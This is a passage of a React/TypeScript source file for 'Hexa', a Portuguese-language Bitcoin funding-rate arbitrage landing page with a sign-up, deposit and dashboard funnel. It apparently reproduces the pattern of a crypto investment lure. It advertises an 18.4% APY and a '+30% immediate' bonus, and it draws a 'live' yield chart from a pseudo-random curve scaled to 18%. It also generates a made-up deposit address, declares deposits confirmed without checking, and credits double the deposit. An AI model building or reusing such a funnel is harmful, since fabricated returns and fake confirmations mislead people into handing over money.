import { createFileRoute } from "@tanstack/react-router";
import { useMemo, useState } from "react";
import {
  ArrowRight,
  Check,
  Copy,
  Lock,
  AlertTriangle,
  Loader2,
  Mail,
  TrendingUp,
  Layers,
  Building2,
  LineChart,
  Wallet,
  ArrowDownToLine,
  ArrowUpFromLine,
  LogOut,
  Zap,
  Scale,
  Activity,
  Store,
  User,
} from "lucide-react";
import { HexaCoin } from "@/components/HexaCoin";
import { Stepper } from "@/components/Stepper";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Hexa — Arbitragem de Funding Rate em Bitcoin" },
      {
        name: "description",
        content:
          "Plataforma institucional de arbitragem de funding rate. Rendimento delta-neutro em BTC, independente da direção do mercado. Bônus de 30% no primeiro aporte.",
      },
      { property: "og:title", content: "Hexa — Arbitragem de Funding Rate em BTC" },
      {
        property: "og:description",
        content: "Capture o diferencial de funding rate entre exchanges com posições delta-neutras. Rendimento em BTC, risco de mercado neutralizado.",
      },
    ],
  }),
  component: Funnel,
});

const BTC_RATE_BRL = 350_000;
const fmtBRL = (v: number) =>
  v.toLocaleString("pt-BR", { style: "currency", currency: "BRL", minimumFractionDigits: 2, maximumFractionDigits: 2 });
const fmtBTC = (v: number) =>
  `${v.toLocaleString("pt-BR", { minimumFractionDigits: 6, maximumFractionDigits: 8 })} BTC`;

type Step =
  | "landing"
  | "auth"
  | "claim"
  | "deposit"
  | "payment"
  | "confirmed"
  | "dashboard";

// Stepper only used in the SIGN-UP funnel. Login jumps straight to dashboard.
const SIGNUP_STEPS: Step[] = ["auth", "claim", "deposit", "payment", "confirmed"];

function Funnel() {
  const [step, setStep] = useState<Step>("landing");
  const [authMode, setAuthMode] = useState<"signup" | "login">("signup");
  const [depositBTC, setDepositBTC] = useState<string>("0.01");

  const depositNum = Math.max(0, Number(depositBTC) || 0);
  const balanceBTC = depositNum * 2;

  const go = (s: Step) => {
    setStep(s);
    requestAnimationFrame(() => window.scrollTo({ top: 0, behavior: "smooth" }));
  };

  const isWide = step === "landing" || step === "dashboard";
  // Stepper only visible during the signup funnel — never during login flow.
  const showStepper = authMode === "signup" && SIGNUP_STEPS.includes(step) && step !== "auth";
  const stepIdx = SIGNUP_STEPS.indexOf(step);

  return (
    <div className="min-h-screen flex flex-col p-2 sm:p-4">
      <div className="relative mx-auto w-full max-w-[1600px] flex-1 flex flex-col rounded-[2rem] sm:rounded-[2.5rem] ring-1 ring-white/10 shadow-2xl bg-[#0c0c0c] overflow-hidden">
        <div
          aria-hidden
          className="pointer-events-none absolute -top-40 -right-40 h-[420px] w-[420px] rounded-full"
          style={{ background: "radial-gradient(circle, oklch(0.83 0.17 84 / 22%) 0%, transparent 70%)", filter: "blur(120px)" }}
        />
        <div
          aria-hidden
          className="pointer-events-none absolute -bottom-40 -left-40 h-[420px] w-[420px] rounded-full"
          style={{ background: "radial-gradient(circle, oklch(0.72 0.16 78 / 22%) 0%, transparent 70%)", filter: "blur(120px)" }}
        />

        <Header onHome={() => go("landing")} showDashboardLink={step === "dashboard"} />

        <main className={`relative flex-1 mx-auto w-full ${isWide ? "max-w-6xl" : "max-w-md"} px-4 sm:px-5 pb-24 pt-4 sm:pt-6`}>
          {showStepper && (
            <div className="mb-6 max-w-md mx-auto hidden sm:block">
              <Stepper current={stepIdx} total={SIGNUP_STEPS.length} />
            </div>
          )}

          <div key={step} className="animate-count-up">
            {step === "landing" && <Landing onStart={() => { setAuthMode("signup"); go("auth"); }} onLogin={() => { setAuthMode("login"); go("auth"); }} />}
            {step === "auth" && (
              <Auth
                mode={authMode}
                onModeChange={setAuthMode}
                onSignup={() => go("claim")}
                onLogin={() => go("dashboard")}
              />
            )}
            {step === "claim" && <Claim onNext={() => go("deposit")} />}
            {step === "deposit" && (
              <Deposit
                value={depositBTC}
                onChange={setDepositBTC}
                onNext={() => go("payment")}
              />
            )}
            {step === "payment" && (
              <Payment amountBTC={depositNum} onNext={() => go("confirmed")} />
            )}
            {step === "confirmed" && (
              <Confirmed amountBTC={depositNum} onNext={() => go("dashboard")} />
            )}
            {step === "dashboard" && (
              <Dashboard balanceBTC={balanceBTC} depositBTC={depositNum} />
            )}
          </div>
        </main>

        <Footer />
      </div>
    </div>
  );
}

function Header({ onHome, showDashboardLink }: { onHome: () => void; showDashboardLink: boolean }) {
  return (
    <header className="relative z-30 px-4 sm:px-5 pt-4 sm:pt-5">
      <div className="mx-auto max-w-6xl flex items-center justify-between">
        <button onClick={onHome} className="leading-tight text-left">
          <div className="text-sm font-semibold tracking-tight flex items-center gap-2">
            <span className="inline-block h-2 w-2 rounded-full bg-lime" />
            Hexa
          </div>
          <div className="font-mono-tag text-white/50 -mt-0.5">Funding Rate Arbitrage</div>
        </button>
        {!showDashboardLink && (
          <nav className="hidden sm:flex items-center gap-6 font-mono-tag text-white/60">
            <a href="#tese" className="hover:text-lime transition">TESE</a>
            <a href="#como" className="hover:text-lime transition">COMO FUNCIONA</a>
            <a href="#performance" className="hover:text-lime transition">PERFORMANCE</a>
            <a href="#bonus" className="hover:text-lime transition">BÔNUS</a>
          </nav>
        )}
      </div>
    </header>
  );
}

function Footer() {
  return (
    <footer className="relative mx-auto max-w-6xl w-full px-4 sm:px-5 py-8">
      <div className="border-t border-white/10 pt-6 space-y-3">
        <div className="font-mono-tag text-white/30">© 2026 HEXA · TODOS OS DIREITOS RESERVADOS</div>
      </div>
    </footer>
  );
}

/* ---------- LANDING ---------- */

function Landing({ onStart, onLogin }: { onStart: () => void; onLogin: () => void }) {
  return (
    <div className="space-y-20 sm:space-y-24">
      {/* HERO */}
      <section className="grid md:grid-cols-2 gap-10 items-center pt-4">
        <div className="space-y-6">
          <div className="font-mono-tag text-lime">// FUNDING RATE ARBITRAGE</div>
          <h1 className="text-4xl sm:text-5xl md:text-6xl font-semibold leading-[0.95] tracking-[-0.05em]">
            Rendimento em BTC,{" "}
            <span
              className="italic font-light"
              style={{
                backgroundImage: "linear-gradient(135deg, #f7c948 0%, #ffffff 100%)",
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                color: "transparent",
              }}
            >
              sem exposição ao preço
            </span>
          </h1>
          <p className="text-white/70 leading-relaxed max-w-xl">
            A Hexa opera arbitragem de <span className="text-lime">funding rate</span> entre exchanges
            de derivativos. Posições <b className="text-white">delta-neutras</b> (long spot + short perpétuo)
            capturam o diferencial pago entre traders alavancados — gerando yield em Bitcoin
            independentemente da direção do mercado.
          </p>

          <div className="grid grid-cols-3 gap-3 max-w-xl">
            <StatChip label="APY MÉDIO" value="18,4%" />
            <StatChip label="DELTA" value="≈ 0" />
            <StatChip label="LIQUIDEZ" value="24/7" />
          </div>

          <div className="rounded-2xl glass p-4 flex items-start gap-3 max-w-xl">
            <div className="h-9 w-9 rounded-full bg-lime/15 text-lime flex items-center justify-center shrink-0">
              <TrendingUp className="h-4 w-4" />
            </div>
            <div className="text-sm">
              <div className="font-semibold text-lime">Bônus de 30% imediato</div>
              <div className="text-white/60 text-xs mt-0.5">
                Aplicado no primeiro aporte como crédito de yield acelerado.
              </div>
            </div>
          </div>

          <div className="flex flex-wrap gap-3 pt-2">
            <button
              onClick={onStart}
              className="group inline-flex items-center gap-2 rounded-full bg-lime text-black font-bold tracking-tight px-7 py-4 text-sm transition-all duration-300 hover:scale-[1.02]"
              style={{ boxShadow: "0 0 30px oklch(0.83 0.17 84 / 35%)" }}
            >
              Começar agora <ArrowRight className="h-5 w-5" />
            </button>
            <button
              onClick={onLogin}
              className="inline-flex items-center gap-2 rounded-full border border-white/15 px-6 py-4 text-sm font-semibold hover:border-lime/50 transition"
            >
              Já tenho conta
            </button>
          </div>
        </div>

        <div className="flex justify-center">
          <div className="animate-float">
            <HexaCoin size={300} />
          </div>
        </div>
      </section>

      {/* TESE */}
      <section id="tese" className="space-y-8">
        <SectionHeading
          tag="A TESE"
          title="Funding rate é o motor invisível dos derivativos cripto"
        />
        <div className="grid md:grid-cols-2 gap-6">
          <p className="text-white/70 leading-relaxed">
            Em contratos perpétuos, o <span className="text-lime">funding rate</span> é o pagamento periódico
            entre quem está comprado e quem está vendido — usado para ancorar o preço do perpétuo ao
            spot. Em mercados otimistas, longs pagam shorts. Em mercados pessimistas, shorts pagam longs.
          </p>
          <p className="text-white/70 leading-relaxed">
            A Hexa fica neutra: <b className="text-white">comprada no spot</b> e <b className="text-white">vendida
            no perpétuo</b>, sempre na mesma quantidade. O movimento do BTC se cancela. O que sobra
            é o funding — pago a cada 8 horas, capturado em BTC, 24/7.
          </p>
        </div>
      </section>

      {/* COMO FUNCIONA */}
      <section id="como" className="space-y-8">
        <SectionHeading tag="COMO FUNCIONA" title="Quatro passos, posição delta-neutra" />
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4">
          <StepCard
            n={1}
            icon={<Wallet className="h-5 w-5" />}
            title="Você aporta em BTC"
            text="O capital entra integralmente em Bitcoin, em custódia institucional segregada."
          />
          <StepCard
            n={2}
            icon={<Scale className="h-5 w-5" />}
            title="Posição equilibrada"
            text="Compramos BTC no spot e abrimos short equivalente no perpétuo. Exposição líquida ≈ 0."
          />
          <StepCard
            n={3}
            icon={<Activity className="h-5 w-5" />}
            title="Captura de funding"
            text="A cada 8h o funding rate é creditado. Quando negativo, rebalanceamos entre exchanges."
          />
          <StepCard
            n={4}
            icon={<Zap className="h-5 w-5" />}
            title="Yield em BTC"
            text="O rendimento se acumula em sats. Saldo total e histórico transparentes no painel."
          />
        </div>
      </section>

      {/* PERFORMANCE */}
      <section id="performance" className="grid md:grid-cols-2 gap-10 items-center">
        <div className="space-y-5">
          <SectionHeading tag="PERFORMANCE" title="Yield consistente, descorrelacionado" inline />
          <p className="text-white/70 leading-relaxed">
            Nosso retorno depende do <span className="text-lime">spread de funding</span> entre venues —
            não do preço do BTC. Em mercados de alta euforia, os retornos sobem. Em correções, a
            estratégia segue capturando rate em magnitude reduzida.
          </p>
          <div className="grid grid-cols-3 gap-3">
            <StatChip label="APY 12M" value="18,4%" />
            <StatChip label="MELHOR MÊS" value="+3,1%" />
            <StatChip label="MESES POSITIVOS" value="11/12" />
          </div>
        </div>
        <div className="rounded-[2rem] glass p-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <div className="font-mono-tag text-white/50">YIELD ACUMULADO (BTC)</div>
              <div className="text-2xl font-semibold tracking-tight mt-1">+18,4% / 12M</div>
            </div>
            <div className="font-mono-tag text-lime flex items-center gap-1.5">
              <span className="h-1.5 w-1.5 rounded-full bg-lime animate-pulse" /> AO VIVO
            </div>
          </div>
          <YieldChart height={180} />
        </div>
      </section>

      {/* POR QUE */}
      <section className="space-y-8">
        <SectionHeading tag="POR QUE HEXA" title="Vantagens estruturais" />
        <div className="grid md:grid-cols-2 gap-4">
          <FeatureCard
            icon={<Scale className="h-5 w-5" />}
            title="Delta-neutro de verdade"
            text="A posição é rebalanceada continuamente para manter exposição líquida ao preço próxima de zero."
          />
          <FeatureCard
            icon={<Layers className="h-5 w-5" />}
            title="Execução multi-exchange"
            text="Rodamos em paralelo nas principais venues — Binance, Bybit, OKX, Deribit — capturando o melhor funding disponível."
          />
          <FeatureCard
            icon={<Building2 className="h-5 w-5" />}
            title="Custódia institucional"
            text="Cold storage segregado, prova-de-reservas on-chain e segregação por cliente."
          />
          <FeatureCard
            icon={<LineChart className="h-5 w-5" />}
            title="Transparência total"
            text="Histórico de funding rate capturado, taxas e PnL disponíveis em tempo real no painel."
          />
        </div>
      </section>

      {/* BÔNUS */}
      <section id="bonus" className="space-y-8">
        <SectionHeading tag="BÔNUS" title="Yield acelerado de boas-vindas" />
        <div className="rounded-[2rem] p-8 sm:p-10 text-center relative overflow-hidden border border-lime/30"
          style={{ background: "linear-gradient(180deg, oklch(0.83 0.17 84 / 8%) 0%, oklch(0.13 0 0) 100%)" }}
        >
          <div className="absolute -top-10 -right-10 opacity-30">
            <HexaCoin size={180} />
          </div>
          <div className="relative space-y-5">
            <div className="font-mono-tag text-lime">RECOMPENSA DE BOAS-VINDAS</div>
            <div className="text-6xl sm:text-7xl font-semibold tracking-[-0.06em] shimmer-text">
              +30%
            </div>
            <p className="text-white/70 max-w-xl mx-auto">
              Receba <b className="text-white">+30% em BTC</b> creditados imediatamente ao primeiro aporte.
              Equivalente a meses de yield antecipados, depositados direto no seu saldo.
            </p>
            <div className="font-mono-tag text-white/40">OFERTA VÁLIDA APENAS PARA NOVOS CLIENTES</div>
            <button
              onClick={onStart}
              className="inline-flex items-center gap-2 rounded-full bg-lime text-black font-bold tracking-tight px-7 py-4 text-sm transition-all duration-300 hover:scale-[1.02]"
              style={{ boxShadow: "0 0 30px oklch(0.83 0.17 84 / 35%)" }}
            >
              Garantir meu bônus de 30% <ArrowRight className="h-5 w-5" />
            </button>
          </div>
        </div>
      </section>

      {/* CTA FINAL */}
      <section className="rounded-[2rem] p-8 sm:p-10 text-center border border-white/10 space-y-5"
        style={{ background: "linear-gradient(180deg, oklch(0.17 0 0) 0%, oklch(0.08 0 0) 100%)" }}
      >
        <h2 className="text-3xl sm:text-4xl font-semibold tracking-[-0.05em]">
          Renda em BTC, sem adivinhar o mercado
        </h2>
        <p className="text-white/70 max-w-2xl mx-auto">
          Faça seu primeiro aporte e receba <b className="text-lime">30% em BTC imediato</b>.
          Estratégia delta-neutra, execução institucional, yield 24/7.
        </p>
        <button
          onClick={onStart}
          className="inline-flex items-center gap-2 rounded-full bg-lime text-black font-bold tracking-tight px-8 py-4 text-sm transition-all duration-300 hover:scale-[1.02]"
          style={{ boxShadow: "0 0 30px oklch(0.83 0.17 84 / 35%)" }}
        >
          Abrir minha conta <ArrowRight className="h-5 w-5" />
        </button>
      </section>
    </div>
  );
}

function SectionHeading({ tag, title, inline }: { tag: string; title: string; inline?: boolean }) {
  return (
    <div className={inline ? "space-y-3" : "space-y-3 text-center max-w-3xl mx-auto"}>
      <div className="font-mono-tag text-lime">// {tag}</div>
      <h2 className="text-3xl sm:text-4xl font-semibold tracking-[-0.05em] leading-tight">{title}</h2>
    </div>
  );
}

function FeatureCard({ icon, title, text }: { icon?: React.ReactNode; title: string; text: string }) {
  return (
    <div className="rounded-2xl glass p-6 space-y-3 hover:border-lime/40 transition">
      {icon && (
        <div className="h-10 w-10 rounded-xl bg-lime/15 text-lime flex items-center justify-center">
          {icon}
        </div>
      )}
      <div className="font-semibold text-lg tracking-tight">{title}</div>
      <p className="text-sm text-white/65 leading-relaxed">{text}</p>
    </div>
  );
}

function StepCard({ n, icon, title, text }: { n: number; icon: React.ReactNode; title: string; text: string }) {
  return (
    <div className="rounded-2xl glass p-5 space-y-3 hover:border-lime/40 transition">
      <div className="flex items-center justify-between">
        <div className="h-10 w-10 rounded-xl bg-lime/15 text-lime flex items-center justify-center">{icon}</div>
        <div className="font-mono-tag text-white/40">0{n}</div>
      </div>
      <div className="font-semibold tracking-tight">{title}</div>
      <p className="text-sm text-white/65 leading-relaxed">{text}</p>
    </div>
  );
}

function StatChip({ label, value }: { label: string; value: string }) {
  return (
    <div className="rounded-xl glass p-3 text-center">
      <div className="font-mono-tag text-white/50">{label}</div>
      <div className="text-lg font-semibold text-lime tabular-nums mt-0.5">{value}</div>
    </div>
  );
}

/* ---------- YIELD CHART ---------- */

function YieldChart({ height = 160 }: { height?: number }) {
  // Stable pseudo-random walk for a yield curve (~+18% over 12 months)
  const points = useMemo(() => {
    const n = 60;
    const seed = 7;
    const arr: number[] = [];
    let v = 0;
    for (let i = 0; i < n; i++) {
      const noise = Math.sin(i * 0.7 + seed) * 0.4 + Math.cos(i * 0.31) * 0.2;
      v += 0.3 + noise * 0.35;
      arr.push(Math.max(0, v));
    }
    // normalize to end at ~18
    const last = arr[arr.length - 1];
    const scale = 18 / last;
    return arr.map((x) => x * scale);
  }, []);

  const W = 600;
  const H = height;
  const pad = 8;
  const max = Math.max(...points);
  const min = 0;
  const xStep = (W - pad * 2) / (points.length - 1);
  const yFor = (v: number) => H - pad - ((v - min) / (max - min)) * (H - pad * 2);

  const path = points.map((v, i) => `${i === 0 ? "M" : "L"} ${pad + i * xStep} ${yFor(v)}`).join(" ");
  const area = `${path} L ${pad + (points.length - 1) * xStep} ${H - pad} L ${pad} ${H - pad} Z`;

  return (
    <svg viewBox={`0 0 ${W} ${H}`} className="w-full h-auto" preserveAspectRatio="none">
      <defs>
        <linearGradient id="yieldFill" x1="0" x2="0" y1="0" y2="1">
          <stop offset="0%" stopColor="oklch(0.83 0.17 84)" stopOpacity="0.45" />
          <stop offset="100%" stopColor="oklch(0.83 0.17 84)" stopOpacity="0" />
        </linearGradient>
      </defs>
      {/* grid */}
      {[0.25, 0.5, 0.75].map((g) => (
        <line key={g} x1={pad} x2={W - pad} y1={pad + g * (H - pad * 2)} y2={pad + g * (H - pad * 2)} stroke="oklch(1 0 0 / 6%)" strokeDasharray="3 4" />
      ))}
      <path d={area} fill="url(#yieldFill)" />
      <path d={path} fill="none" stroke="oklch(0.83 0.17 84)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
      <circle cx={pad + (points.length - 1) * xStep} cy={yFor(points[points.length - 1])} r="4" fill="oklch(0.83 0.17 84)" />
    </svg>
  );
}

/* ---------- AUTH ---------- */

function Auth({
  mode, onModeChange, onSignup, onLogin,
}: {
  mode: "signup" | "login";
  onModeChange: (m: "signup" | "login") => void;
  onSignup: () => void;
  onLogin: () => void;
}) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const valid =
    email.includes("@") &&
    password.length >= 6 &&
    (mode === "login" || name.trim().length >= 2);

  return (
    <div className="space-y-5">
      <SectionTitle
        title={mode === "signup" ? "Crie sua conta Hexa" : "Acesse sua conta"}
        subtitle={
          mode === "signup"
            ? "Cadastre-se em 1 minuto e ative o bônus de 30% no primeiro aporte."
            : "Entre com seu e-mail e senha para acessar o painel."
        }
      />

      <div className="grid grid-cols-2 gap-1 rounded-full glass p-1">
        {(["signup", "login"] as const).map((m) => (
          <button
            key={m}
            onClick={() => onModeChange(m)}
            className={`rounded-full py-2 text-xs font-semibold tracking-wide transition ${
              mode === m ? "bg-lime text-black" : "text-white/60 hover:text-white"
            }`}
          >
            {m === "signup" ? "CADASTRO" : "LOGIN"}
          </button>
        ))}
      </div>

      <div className="rounded-[2rem] glass p-5 space-y-3">
        {mode === "signup" && (
          <Field label="NOME COMPLETO">
            <input
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Seu nome"
              className="w-full rounded-xl bg-white/[0.04] border border-white/10 px-4 py-3.5 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition placeholder:text-white/30"
            />
          </Field>
        )}

        <Field label="E-MAIL">
          <div className="relative">
            <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
            <input
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              type="email"
              placeholder="voce@email.com"
              className="w-full rounded-xl bg-white/[0.04] border border-white/10 pl-10 pr-4 py-3.5 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition placeholder:text-white/30"
            />
          </div>
        </Field>

        <Field label="SENHA">
          <div className="relative">
            <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
            <input
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              type="password"
              placeholder="••••••••"
              className="w-full rounded-xl bg-white/[0.04] border border-white/10 pl-10 pr-4 py-3.5 text-sm outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition placeholder:text-white/30"
            />
          </div>
        </Field>

      </div>

      <PrimaryButton
        onClick={() => {
          setLoading(true);
          setTimeout(() => (mode === "signup" ? onSignup() : onLogin()), 700);
        }}
        disabled={!valid || loading}
      >
        {loading ? (
          <><Loader2 className="h-5 w-5 animate-spin" /> {mode === "signup" ? "Criando conta…" : "Entrando…"}</>
        ) : (
          <>{mode === "signup" ? "Criar conta" : "Entrar"} <ArrowRight className="h-5 w-5" /></>
        )}
      </PrimaryButton>
    </div>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="space-y-1.5">
      <label className="font-mono-tag text-white/50">{label}</label>
      {children}
    </div>
  );
}

/* ---------- CLAIM (signup only) ---------- */

function Claim({ onNext }: { onNext: () => void }) {
  return (
    <div className="space-y-5">
      <SectionTitle
        title="Ative seu bônus de boas-vindas"
        subtitle="Como novo cliente, você tem direito a +30% em BTC creditados imediatamente no primeiro aporte."
      />

      <div className="rounded-[2rem] glass p-6 space-y-4">
        <div className="flex justify-center"><HexaCoin size={104} /></div>
        <div className="text-center space-y-1">
          <div className="font-mono-tag text-white/50">YIELD ACELERADO DE BOAS-VINDAS</div>
          <div className="text-5xl font-semibold tracking-[-0.06em] shimmer-text">+30%</div>
          <div className="text-xs text-white/60">Creditado em BTC após confirmação do depósito</div>
        </div>
        <BenefitRow text="Crédito imediato em BTC após confirmação on-chain" />
        <BenefitRow text="Estratégia delta-neutra ativa 24/7 a partir do primeiro sat" />
        <BenefitRow text="Painel transparente de funding capturado e PnL" />
      </div>

      <PrimaryButton onClick={onNext}>
        Continuar para o aporte <ArrowRight className="h-5 w-5" />
      </PrimaryButton>
    </div>
  );
}

function BenefitRow({ text }: { text: string }) {
  return (
    <div className="flex items-center gap-3 rounded-2xl bg-white/[0.03] border border-white/10 p-3">
      <span className="h-1.5 w-1.5 rounded-full bg-lime shrink-0" />
      <span className="text-sm text-white/90">{text}</span>
    </div>
  );
}

/* ---------- DEPOSIT ---------- */

function Deposit({
  value, onChange, onNext,
}: { value: string; onChange: (v: string) => void; onNext: () => void }) {
  const [loading, setLoading] = useState(false);
  const num = Number(value) || 0;
  const valid = num >= 0.0005;
  const brlEquiv = num * BTC_RATE_BRL;
  const quickBTC = [0.005, 0.01, 0.05, 0.1];
  const quickBRL = [500, 1000, 5000, 10000];
  const setFromBRL = (brl: number) => {
    const btc = brl / BTC_RATE_BRL;
    // 8-decimal precision (1 sat) — keeps BRL ↔ BTC consistent
    onChange(btc.toFixed(8).replace(/0+$/, "").replace(/\.$/, ""));
  };

  return (
    <div className="space-y-5">
      <SectionTitle
        title="Defina seu aporte em BTC"
        subtitle="O bônus de 30% é creditado em BTC imediatamente após a confirmação on-chain."
      />

      <div className="rounded-[2rem] glass p-5 space-y-4">
        <Field label="VALOR DO APORTE (BTC)">
          <div className="relative">
            <span className="absolute left-4 top-1/2 -translate-y-1/2 font-mono-tag text-lime">BTC</span>
            <input
              value={value}
              onChange={(e) => onChange(e.target.value.replace(/[^0-9.]/g, ""))}
              inputMode="decimal"
              placeholder="0.01"
              className="w-full rounded-xl bg-white/[0.04] border border-white/10 pl-16 pr-4 py-4 text-3xl font-semibold tracking-tight outline-none focus:border-lime focus:ring-2 focus:ring-lime/30 transition tabular-nums"
            />
          </div>
        </Field>

        <div className="grid grid-cols-4 gap-2">
          {quickBTC.map((q) => (
            <button
              key={q}
              onClick={() => onChange(String(q))}
              className={`rounded-lg py-2 text-xs font-semibold border transition ${
                num === q
                  ? "bg-lime text-black border-lime"
                  : "bg-white/[0.03] border-white/10 text-white/60 hover:text-white"
              }`}
            >
              {q} BTC
            </button>
          ))}
        </div>

        <div className="grid grid-cols-4 gap-2">
          {quickBRL.map((q) => (
            <button
              key={q}
              onClick={() => setFromBRL(q)}
              className="rounded-lg py-2 text-xs font-semibold border bg-white/[0.03] border-white/10 text-white/60 hover:text-white transition tabular-nums"
            >
              R$ {q.toLocaleString("pt-BR")}
            </button>
          ))}
        </div>

        {/* BTC is the hero; BRL is a small reference */}
        <div className="rounded-xl bg-black/40 border border-white/10 p-4 space-y-1">
          <div className="font-mono-tag text-white/50">VOCÊ VAI DEPOSITAR</div>
          <div className="text-3xl font-semibold tabular-nums tracking-tight">{fmtBTC(num)}</div>
          <div className="text-xs text-white/40 tabular-nums">≈ {fmtBRL(brlEquiv)} · 1 BTC ≈ {fmtBRL(BTC_RATE_BRL)}</div>
        </div>

        <div className="rounded-xl bg-lime/10 border border-lime/30 p-3 flex items-center justify-between">
          <div>
            <div className="font-mono-tag text-lime/80">BÔNUS APLICADO</div>
            <div className="text-lg font-semibold text-lime tabular-nums">
              +{(num * 0.3).toLocaleString("pt-BR", { minimumFractionDigits: 6, maximumFractionDigits: 8 })} BTC
            </div>
          </div>
          <div className="rounded-full bg-lime/20 px-3 py-1 text-xs font-bold text-lime">
            +30% imediato
          </div>
        </div>

        {num > 0 && num < 0.0005 && (
          <p className="text-xs text-warning">Aporte mínimo: 0.0005 BTC</p>
        )}
      </div>

      <PrimaryButton
        onClick={() => { setLoading(true); setTimeout(() => onNext(), 1000); }}
        disabled={!valid || loading}
      >
        {loading ? (
          <><Loader2 className="h-5 w-5 animate-spin" /> Gerando endereço…</>
        ) : (
          <>Gerar endereço de depósito <ArrowRight className="h-5 w-5" /></>
        )}
      </PrimaryButton>
    </div>
  );
}

/* ---------- PAYMENT ---------- */

function Payment({ amountBTC, onNext }: { amountBTC: number; onNext: () => void }) {
  const address = useMemo(() => {
    const seed = Math.max(1, Math.round(amountBTC * 1e8));
    const hex = (seed * 2654435761 >>> 0).toString(16).padStart(8, "0");
    return `bc1q${hex}${hex.slice(0, 4)}${hex.slice(4)}xprq${hex.slice(0, 6)}`;
  }, [amountBTC]);

  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(address);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {}
  };

  return (
    <div className="space-y-5">
      <SectionTitle
        title="Envie seu depósito em BTC"
        subtitle={`Transfira exatamente ${fmtBTC(amountBTC)} para o endereço abaixo.`}
      />

      <div className="rounded-[2rem] glass p-5 space-y-4">
        <div className="rounded-xl bg-black/40 border border-white/10 p-4 space-y-1">
          <div className="flex items-center justify-between">
            <span className="font-mono-tag text-white/50">VALOR EXATO A DEPOSITAR</span>
            <span className="font-mono-tag text-lime flex items-center gap-1.5">
              <span className="h-1.5 w-1.5 rounded-full bg-lime animate-pulse" /> AGUARDANDO
            </span>
          </div>
          <div className="text-3xl font-semibold tabular-nums tracking-tight">{fmtBTC(amountBTC)}</div>
          <div className="text-xs text-white/40">≈ {fmtBRL(amountBTC * BTC_RATE_BRL)}</div>
        </div>

        <div>
          <div className="font-mono-tag text-white/50 mb-2">ENDEREÇO BITCOIN (REDE BTC)</div>
          <div className="rounded-xl bg-black/50 border border-white/10 p-3 font-mono text-[12px] leading-relaxed break-all text-white/85 select-all">
            {address}
          </div>
        </div>

        <button
          onClick={copy}
          className="w-full flex items-center justify-center gap-2 rounded-xl bg-white/[0.04] border border-white/10 hover:border-lime/50 transition px-4 py-3 text-sm font-semibold"
        >
          {copied ? (
            <><Check className="h-4 w-4 text-lime" /> <span className="text-lime">Endereço copiado</span></>
          ) : (
            <><Copy className="h-4 w-4" /> Copiar endereço</>
          )}
        </button>
      </div>

      <PrimaryButton onClick={onNext}>
        Já enviei o depósito <ArrowRight className="h-5 w-5" />
      </PrimaryButton>
    </div>
  );
}

/* ---------- CONFIRMED ---------- */

function Confirmed({ amountBTC, onNext }: { amountBTC: number; onNext: () => void }) {
  return (
    <div className="space-y-5 text-center">
      <div className="flex justify-center pt-2">
        <div className="h-20 w-20 rounded-full bg-lime/20 flex items-center justify-center animate-pulse-gold">
          <Check className="h-10 w-10 text-lime" />
        </div>
      </div>

      <SectionTitle
        title="Depósito confirmado"
        subtitle="Seu aporte foi recebido. O bônus de 30% em BTC já está creditado e a estratégia está ativa."
      />

      <div className="rounded-[2rem] glass p-5 space-y-3 text-left">
        <Row label="Aporte recebido" value={fmtBTC(amountBTC)} />
        <Row label="Bônus de boas-vindas" value={`+${fmtBTC(amountBTC * 0.3)}`} success />
        <div className="h-px bg-white/10" />
        <Row label="Saldo creditado" value={fmtBTC(amountBTC * 2)} highlight />
        <div className="text-right text-xs text-white/40 tabular-nums">≈ {fmtBRL(amountBTC * 2 * BTC_RATE_BRL)}</div>
      </div>

      <PrimaryButton onClick={onNext}>
        Acessar meu painel <ArrowRight className="h-5 w-5" />
      </PrimaryButton>
    </div>
  );
}

/* ---------- DASHBOARD ---------- */

type DashTab = "overview" | "deposit" | "withdraw" | "market" | "profile";

const TABS: { id: DashTab; label: string; icon: React.ReactNode }[] = [
  { id: "overview", label: "Visão", icon: <LineChart className="h-4 w-4" /> },
  { id: "deposit", label: "Depositar", icon: <ArrowDownToLine className="h-4 w-4" /> },
  { id: "withdraw", label: "Sacar", icon: <ArrowUpFromLine className="h-4 w-4" /> },
  { id: "market", label: "Mercado", icon: <Store className="h-4 w-4" /> },
  { id: "profile", label: "Perfil", icon: <User className="h-4 w-4" /> },
];

function Dashboard({ balanceBTC, depositBTC }: { balanceBTC: number; depositBTC: number }) {
  const [tab, setTab] = useState<DashTab>("overview");
  const [currentBalance, setCurrentBalance] = useState(balanceBTC);

  const onWithdrawn = (amount: number) => {
    setCurrentBalance((b) => Math.max(0, b - amount));
    setTab("overview");
  };

  return (
    <div className="md:grid md:grid-cols-[220px_1fr] md:gap-6">
      {/* Desktop sidebar */}
      <aside className="hidden md:block rounded-[2rem] glass p-3 h-fit">
        <div className="space-y-1">
          {TABS.map((t) => (
            <SideItem key={t.id} icon={t.icon} active={tab === t.id} onClick={() => setTab(t.id)}>
              {t.label === "Visão" ? "Visão geral" : t.label}
            </SideItem>
          ))}
          <div className="h-px bg-white/10 my-2" />
          <SideItem icon={<LogOut className="h-4 w-4" />} onClick={() => window.location.reload()}>Sair</SideItem>
        </div>
      </aside>

      {/* Main */}
      <section className="space-y-4 sm:space-y-5 pb-24 md:pb-0">
        {tab === "overview" && <Overview balanceBTC={currentBalance} depositBTC={depositBTC} onWithdraw={() => setTab("withdraw")} />}
        {tab === "deposit" && <DepositTab />}
